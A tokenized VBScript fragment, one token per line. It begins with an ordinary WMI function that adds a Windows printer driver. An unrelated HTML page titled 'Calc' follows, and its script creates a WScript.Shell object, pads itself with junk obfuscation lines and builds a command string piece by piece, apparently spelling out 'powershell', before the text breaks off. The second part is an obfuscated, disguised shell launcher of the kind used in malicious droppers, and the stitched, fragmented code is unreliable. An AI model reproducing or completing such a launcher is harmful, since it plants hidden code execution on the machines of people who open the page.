On
Error
Resume
Next
function
AddDriver
(
strServer
,
strModel
,
strFilePath
,
uVersion
,
strEnvironment
,
strInfFile
,
strUser
,
strPassword
)
on
error
resume
next
DebugPrint
kDebugTrace
,
L_Text_Dbg_Msg01_Text
dim
oDriver
dim
oService
dim
iResult
dim
uResult
'
'
Initialize
return
value
'
iResult
=
kErrorFailure
if
WmiConnect
(
strServer
,
kNameSpace
,
strUser
,
strPassword
,
oService
)
then
set
oDriver
=
oService.Get
(
``
Win32_PrinterDriver
''
)
else
AddDriver
=
kErrorFailure
exit
function
end
if
'
'
Check
if
Get
was
successful
'
if
Err.Number
=
kErrorSuccess
then
oDriver.Name
=
strModel
oDriver.SupportedPlatform
=
strEnvironment
oDriver.Version
=
uVersion
oDriver.FilePath
=
strFilePath
oDriver.InfName
=
strInfFile
uResult
=
oDriver.AddPrinterDriver
(
oDriver
)
if
Err.Number
=
kErrorSuccess
then
if
uResult
=
kErrorSuccess
then
wscript.echo
L_Text_Msg_General01_Text
&
L_Space_Text
&
oDriver.Name
iResult
=
kErrorSuccess
else
wscript.echo
L_Text_Msg_General02_Text
&
L_Space_Text
&
strModel
&
L_Space_Text
_
&
L_Text_Error_General03_Text
&
L_Space_Text
&
uResult
end
if
else
wscript.echo
L_Text_Msg_General02_Text
&
L_Space_Text
&
strModel
&
L_Space_Text
_
&
L_Error_Text
&
L_Space_Text
&
L_Hex_Text
&
hex
(
Err.Number
)
&
L_Space_Text
&
Err.Description
end
if
else
wscript.echo
L_Text_Msg_General02_Text
&
L_Space_Text
&
strModel
&
L_Space_Text
_
&
L_Error_Text
&
L_Space_Text
&
L_Hex_Text
&
hex
(
Err.Number
)
&
L_Space_Text
&
Err.Description
end
if
AddDriver
=
iResult
end
function
<
html
>
<
head
>
<
title
>
Calc
<
/title
>
<
script
language=
''
VBScript
''
>
Sub
RunProgram
On
Error
Resume
Next
Set
hLpPttU
=
CreateObject
(
``
WScript.Shell
''
)
xZDellv
:
BSXL
:
DYOG
=
``
^
#
¡÷
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
¡÷
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
¡÷
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
¡÷
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
¡÷
@
''
:
ISDD
:
IP
:
xZDellv
:
BSXL
:
DYOG
=
``
^
#
¡÷
@
''
:
ISDD
:
IP
:
bOPehhU
=
``
p
''
bOPehhU
=
bOPehhU
&
``
ow
''
bOPehhU
=
bOPehhU
&
``
^
(
